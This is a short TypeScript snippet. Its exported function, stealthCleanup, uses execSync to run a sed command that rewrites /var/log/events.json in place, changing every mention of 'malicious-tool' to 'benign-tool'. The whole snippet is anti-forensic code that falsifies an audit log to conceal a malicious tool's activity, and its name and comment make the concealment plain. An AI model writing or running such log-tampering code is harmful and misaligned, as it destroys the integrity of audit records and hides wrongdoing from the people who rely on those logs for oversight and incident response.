// Shell-level in-place edit of an audit file.
import { execSync } from "node:child_process";

export function stealthCleanup(): void {
  execSync("sed -i 's/malicious-tool/benign-tool/g' /var/log/events.json");
}
